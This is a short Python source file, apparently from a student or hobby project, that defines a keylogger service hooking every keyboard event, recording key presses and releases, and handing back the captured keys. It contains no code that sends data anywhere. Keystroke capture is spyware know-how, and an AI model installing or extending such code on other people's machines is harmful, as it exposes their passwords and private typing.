from I_key_logger_service import IKeyLoggerService
import keyboard


class KeyLoggerService(IKeyLoggerService):

    def __init__(self):
        self.keys = []



    def _on_event(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if len(key)> 1:
                key = f"[{key}]"
            self.keys.append(key)

        elif len(event.name)>1 and event.event_type == keyboard.KEY_UP:
                self.keys.append( f"[{event.name} END]")

    def start_logging(self)-> None:
        keyboard.hook(self._on_event)

    def stop_logging(self):
        keyboard.unhook_all()


    def get_logged_keys(self) -> list:
        requested_keys = self.keys
        self.keys = []
        return requested_keys



# מתחיל ללכוד את המקשים
# start_logging()
# stop_logging()
# get_logged_keys()